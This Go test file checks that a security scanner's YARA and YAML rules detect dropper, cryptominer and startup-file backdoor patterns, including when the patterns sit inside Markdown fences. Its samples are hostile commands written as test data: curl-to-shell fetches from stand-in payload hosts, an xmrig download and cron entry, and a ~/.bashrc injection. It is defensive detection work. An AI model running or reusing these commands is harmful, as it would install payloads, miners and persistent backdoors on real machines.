//go:build yara

package yara_test

import (
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/pidginhost/csm/internal/signatures"
	csmyara "github.com/pidginhost/csm/internal/yara"
)

func loadDownloadRuleScanners(t *testing.T) (*csmyara.Scanner, *signatures.Scanner) {
	t.Helper()
	_, thisFile, _, ok := runtime.Caller(0)
	if !ok {
		t.Fatal("runtime.Caller failed")
	}
	configsDir := filepath.Join(filepath.Dir(thisFile), "..", "..", "configs")
	yaraScanner, err := csmyara.NewScanner(configsDir)
	if err != nil {
		t.Fatalf("loading YARA rules: %v", err)
	}
	yamlScanner := signatures.NewScanner(configsDir)
	if err := yamlScanner.LoadError(); err != nil {
		t.Fatalf("loading YAML rules: %v", err)
	}
	return yaraScanner, yamlScanner
}

// The download and miner rules look for their parts within a bounded span of
// one line. These cases pin what that span still covers in both engines.
func TestDownloadRuleSpansBothEngines(t *testing.T) {
	yaraScanner, yamlScanner := loadDownloadRuleScanners(t)
	tests := []struct {
		name     string
		yamlRule string
		yaraRule string
		ext      string
		sample   string
		want     bool
	}{
		{
			name:     "download command after a long code prefix",
			yamlRule: "dropper_wget_exec",
			yaraRule: "dropper_wget_exec",
			ext:      ".php",
			sample:   "<?php $pad = '" + strings.Repeat("x", 5000) + "'; system('curl http://payload.example.test/p | sh');\n",
			want:     true,
		},
		{
			name:     "download command after other commands on its line",
			yamlRule: "dropper_wget_exec",
			yaraRule: "dropper_wget_exec",
			ext:      ".sh",
			sample:   "cd /tmp; wget http://payload.example.test/b -O b; curl http://payload.example.test/p | sh\n",
			want:     true,
		},
		{
			name:     "long usage comment naming an installer",
			yamlRule: "dropper_wget_exec",
			yaraRule: "dropper_wget_exec",
			ext:      ".sh",
			sample:   "# " + strings.Repeat("word ", 40) + "curl https://get.example.test/install.sh | sh\n",
		},
		{
			name:     "miner release download",
			yamlRule: "miner_shell_script",
			yaraRule: "miner_shell_downloader",
			ext:      ".sh",
			sample:   "#!/bin/sh\nwget -q -O /tmp/.cache/k https://downloads.example.test/releases/v6.21.0/static/linux-x64/xmrig-6.21.0-linux-static-x64.tar.gz\n",
			want:     true,
		},
		{
			name:     "cron entry starting a miner",
			yamlRule: "miner_cron_persistence",
			yaraRule: "miner_cron_persistence",
			ext:      ".sh",
			sample:   "*/10 * * * * /tmp/.x/xmrig --config /tmp/.x/c.json >/dev/null 2>&1\n",
			want:     true,
		},
		{
			name:     "download appended to a startup file",
			yamlRule: "backdoor_bashrc_injection",
			yaraRule: "backdoor_bashrc_injection",
			ext:      ".bashrc",
			sample:   "echo 'curl http://payload.example.test/x.sh | bash' >> ~/.bashrc\n",
			want:     true,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			content := []byte(tc.sample)
			matches, err := yaraScanner.ScanBytesChecked(content)
			if err != nil {
				t.Fatalf("YARA scan failed: %v", err)
			}
			if got := hasRepositoryYaraRule(matches, tc.yaraRule); got != tc.want {
				t.Errorf("YARA %s matched = %t, want %t", tc.yaraRule, got, tc.want)
			}
			if got := hasSignatureRule(yamlScanner.ScanContent(content, tc.ext), tc.yamlRule); got != tc.want {
				t.Errorf("YAML %s matched = %t, want %t", tc.yamlRule, got, tc.want)
			}
		})
	}
}

// Markdown suppression exists only in the YARA rules. A command counts as
// documentation only inside a fenced block or as link text.
func TestDownloadRuleMarkdownSpans(t *testing.T) {
	yaraScanner, _ := loadDownloadRuleScanners(t)
	fencedRC := "```sh\necho 'curl https://get.example.test/a | bash' >> ~/.bashrc\n```\n"
	tests := []struct {
		name   string
		rule   string
		sample string
		want   bool
	}{
		{
			name:   "command in an indented fenced block",
			rule:   "dropper_wget_exec",
			sample: "1. Install:\n\n    ```sh\n    curl -fsSL https://get.example.test/a | sh\n    ```\n",
		},
		{
			name:   "command in a longer backtick fence",
			rule:   "dropper_wget_exec",
			sample: "````sh\ncurl -fsSL https://get.example.test/a | sh\n````\n",
		},
		{
			name:   "command in a fenced block with CRLF lines",
			rule:   "dropper_wget_exec",
			sample: "```sh\r\ncurl -fsSL https://get.example.test/a | sh\r\n```\r\n",
		},
		{
			name:   "command on the opening line of a fence",
			rule:   "dropper_wget_exec",
			sample: "```curl http://payload.example.test/p | sh\n```\n",
			want:   true,
		},
		{
			name:   "command after a closing fence on the same line",
			rule:   "dropper_wget_exec",
			sample: "```sh\n:\n```curl http://payload.example.test/p | sh\n",
			want:   true,
		},
		{
			name:   "command before fenced documentation",
			rule:   "dropper_wget_exec",
			sample: "curl http://payload.example.test/p | bash\n\n```sh\ncurl -fsSL https://get.example.test/a | sh\n```\n",
			want:   true,
		},
		{
			name:   "command after many fenced blocks",
			rule:   "dropper_wget_exec",
			sample: strings.Repeat("```sh\ncurl -fsSL https://get.example.test/a | sh\n```\n\n", 50) + "curl http://payload.example.test/p | bash\n",
			want:   true,
		},
		{
			name:   "command after a link line",
			rule:   "dropper_wget_exec",
			sample: "[curl -fsSL https://get.example.test/a | sh](https://get.example.test/)\ncurl http://payload.example.test/p | bash\n",
			want:   true,
		},
		{
			name:   "startup-file command in a fenced block",
			rule:   "backdoor_bashrc_injection",
			sample: fencedRC,
		},
		{
			name:   "startup-file command after fenced documentation",
			rule:   "backdoor_bashrc_injection",
			sample: fencedRC + "echo 'curl http://payload.example.test/x.sh | bash' >> ~/.bashrc\n",
			want:   true,
		},
		{
			// Suppression is not examined in a file with more Markdown spans
			// than any published document carries, so its cost stays linear.
			name:   "startup-file commands in an oversized document",
			rule:   "backdoor_bashrc_injection",
			sample: strings.Repeat(fencedRC, 1001),
			want:   true,
		},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			matches, err := yaraScanner.ScanBytesChecked([]byte(tc.sample))
			if err != nil {
				t.Fatalf("YARA scan failed: %v", err)
			}
			if got := hasRepositoryYaraRule(matches, tc.rule); got != tc.want {
				t.Errorf("%s matched = %t, want %t", tc.rule, got, tc.want)
			}
		})
	}
}
